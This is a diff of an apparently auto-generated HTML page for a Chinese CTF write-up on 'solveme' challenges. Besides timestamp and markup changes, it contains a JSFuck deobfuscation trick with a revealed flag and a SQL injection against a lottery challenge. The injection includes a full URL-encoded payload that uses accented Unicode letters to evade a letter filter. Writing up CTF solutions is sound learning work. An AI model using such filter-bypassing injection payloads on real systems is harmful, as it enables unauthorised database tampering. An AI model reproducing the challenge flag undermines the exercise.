@@ -239,7 +239,7 @@
 
     
         <meta property="article:published_time" content="Sun Mar 18 2018 18:33:16 GMT+0800">
-        <meta property="article:modified_time" content="Tue Apr 03 2018 23:47:48 GMT+0800">
+        <meta property="article:modified_time" content="Wed Apr 04 2018 00:04:02 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -262,7 +262,7 @@
     "mainEntityOfPage": "http://ringfall.me/2018/03/18/solveme/index.html",
     "headline": "solveme",
     "datePublished": "Sun Mar 18 2018 18:33:16 GMT+0800",
-    "dateModified": "Tue Apr 03 2018 23:47:48 GMT+0800",
+    "dateModified": "Wed Apr 04 2018 00:04:02 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "铃落",
@@ -554,8 +554,12 @@
 <p>WTF…不管在哪个网站解。。都是弹窗。。喵喵喵？</p>
 <p>然后继续撒夫夫地搜”jsfuck在线解“居然第三个答案就是这题wp！惊了！一直以为这个网站米有wp存在的。。。</p>
 <p>然后学到两个姿势</p>
-<p>1.<code>eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()  //翻译格式</code></p>
-<p>2.sublime里Ctrl+Shift+Space就可以选中所在的括号及对应括号间的区域~</p>
+<ol>
+<li><p><code>eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()  //翻译格式</code></p>
+</li>
+<li><p>sublime里Ctrl+Shift+Space就可以选中所在的括号及对应括号间的区域~</p>
+</li>
+</ol>
 <p>然后选到第二段炒鸡长的放控制台就有啦</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">// good job!</div><div class="line"></div><div class="line">let flag = prompt(&quot;what is the flag?&quot;);</div><div class="line"></div><div class="line">if (flag === &quot;&quot;) &#123;</div><div class="line"></div><div class="line">	alert(&quot;plz input&quot;);</div><div class="line"></div><div class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</div><div class="line"></div><div class="line">	alert(&quot;bingo&quot;);</div><div class="line"></div><div class="line">&#125; else &#123;</div><div class="line"></div><div class="line">	alert(&quot;wrong&quot;);</div><div class="line"></div><div class="line">&#125;&quot;</div></pre></td></tr></table></figure>
 <p>（补充：卧槽。。方方土学长的另一种骚操作：</p>
@@ -623,11 +627,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$nums = preg_replace(&quot;/[a-zA-Z[]=]/&quot;, &quot;&quot;, $url_query);</div></pre></td></tr></table></figure>
 <p>字母全不行，但是没过滤任何符号</p>
 <p>先看要怎么注：</p>
-<figure class="highlight plain"><figcaption><span>INTO lottery(name, time, nums) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$nums是传入的</div><div class="line"></div><div class="line">```INSERT INTO lottery(name, time, nums) VALUE(&apos;&#123;$name&#125;&apos;, &apos;&#123;$time&#125;&apos;, &apos;1&apos;),(&apos;admin_ip&quot;&apos;,&apos;time()&apos;,&apos;1,1,1,1,1&apos;),(&apos;guest_ip&apos;,&apos;time()&apos;,&apos;1,1,1,1,1&apos;)#&apos;);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO lottery(name, time, nums) VALUE(&apos;&#123;$name&#125;&apos;, &apos;&#123;$time&#125;&apos;, &apos;&#123;$nums&#125;&apos;);</div></pre></td></tr></table></figure>
+<p>$nums是传入的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO lottery(name, time, nums) VALUE(&apos;&#123;$name&#125;&apos;, &apos;&#123;$time&#125;&apos;, &apos;1&apos;),(&apos;admin_ip&quot;&apos;,&apos;time()&apos;,&apos;1,1,1,1,1&apos;),(&apos;guest_ip&apos;,&apos;time()&apos;,&apos;1,1,1,1,1&apos;)#&apos;);</div></pre></td></tr></table></figure>
 <p>这样使我们注入的IP再不带参数地访问时就可以匹配惹</p>
 <p>然后。这里面唯十个字母咋办呢。</p>
 <p>果断是找编码代替：无字母且SQL能识别</p>
-<p>悄咪咪看wp~有这样一个[神奇的网站][<a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="external">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a>]</p>
+<p>悄咪咪看wp~有这样一个<a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="external">神奇的网站</a></p>
 <p>最后payload</p>
 <p><code>http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1&#39;),(&#39;%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_192.34.62.236&#39;,&#39;1522763149&#39;,&#39;1,1,1,1,1&#39;),(&#39;%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_192.34.62.236&#39;,&#39;1522763149&#39;,&#39;1,1,1,1,1&#39;)%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D=</code></p>
 <p>url解码粗来是这样滴</p>
